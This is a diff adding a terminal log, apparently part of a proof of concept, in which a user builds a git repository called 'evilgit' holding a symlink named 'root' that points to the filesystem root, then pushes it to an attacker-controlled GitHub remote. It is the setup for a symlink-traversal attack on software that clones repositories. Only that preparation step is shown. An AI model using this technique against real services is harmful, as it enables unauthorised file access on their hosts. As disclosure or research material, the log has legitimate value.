@@ -1,0 +1,26 @@
+nopnop@tla:/tmp$ mkdir evilgit
+nopnop@tla:/tmp$ cd evilgit/
+nopnop@tla:/tmp/evilgit$ git init .
+Initialized empty Git repository in /tmp/evilgit/.git/
+nopnop@tla:/tmp/evilgit$ ln -s / root
+nopnop@tla:/tmp/evilgit$ ls -la
+total 36
+drwxrwxr-x  3 nopnop nopnop  4096 vas.   2 10:20 .
+drwxrwxrwt 60 root   root   24576 vas.   2 10:19 ..
+drwxrwxr-x  7 nopnop nopnop  4096 vas.   2 10:20 .git
+lrwxrwxrwx  1 nopnop nopnop     1 vas.   2 10:20 root -> /
+nopnop@tla:/tmp/evilgit$ git add .
+nopnop@tla:/tmp/evilgit$ git commit -m "First commit"
+[master (root-commit) d0e66e9] First commit
+1 file changed, 1 insertion(+)
+create mode 120000 root
+nopnop@tla:/tmp/evilgit$ git branch -M main
+nopnop@tla:/tmp/evilgit$ git remote add origin git@github.com:wflk/evilgit.git #should change to your controlled repository on Github
+nopnop@tla:/tmp/evilgit$ git push -u origin main
+Counting objects: 3, done.
+Writing objects: 100% (3/3), 204 bytes | 204.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0)
+To github.com:wflk/evilgit.git
+* [new branch]      main -> main
+Branch 'main' set up to track remote branch 'main' from 'origin'.
+nopnop@tla:/tmp/evilgit$ 
